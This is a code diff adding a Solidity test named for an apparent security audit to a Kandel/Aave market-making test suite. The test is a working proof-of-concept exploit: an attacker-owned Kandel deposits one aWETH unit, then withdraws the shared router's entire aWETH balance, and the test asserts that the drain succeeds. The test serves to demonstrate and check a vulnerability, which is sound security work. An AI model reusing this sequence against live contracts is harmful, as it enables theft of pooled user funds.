@@ -355,4 +355,33 @@ contract AaveKandelTest is CoreKandelTest {
     }
     printOrderBook($(quote), $(base));
   }
+
+  function test_chainsec_attack() public {
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    AaveKandel attackKandel = AaveKandel(payable(__deployKandel__(address(attacker), address(0))));
+
+    deal($(base), address(attacker), 1);
+    attacker.approveLender(base);
+    attacker.supply(base, 1);
+    IERC20 atoken = attacker.overlying(base);
+    console.log("router's aWETHs before attack", atoken.balanceOf(address(router)));
+
+    vm.startPrank(address(attacker));
+    // allows attacker to deposit aWETHS on its Kandel strat
+    atoken.approve({spender: address(aaveKandel), amount: type(uint).max});
+    // allows attackKandel to push aWETHs to the router
+    attackKandel.approve(IERC20(atoken), address(router), type(uint).max);
+    aaveKandel.depositFunds(dynamic([IERC20(atoken)]), dynamic([uint(1)]));
+    vm.stopPrank();
+
+    console.log("router's aWETHs after deposit", atoken.balanceOf(address(router)));
+
+    vm.startPrank(address(attacker));
+    attackKandel.withdrawFunds(
+      dynamic([IERC20(atoken)]), dynamic([uint(atoken.balanceOf(address(router)))]), address(attacker)
+    );
+    vm.stopPrank();
+    assertEq(atoken.balanceOf(address(router)), 0, "Attack failed");
+    console.log("router's aWETHs after attack", atoken.balanceOf(address(router)));
+  }
 }
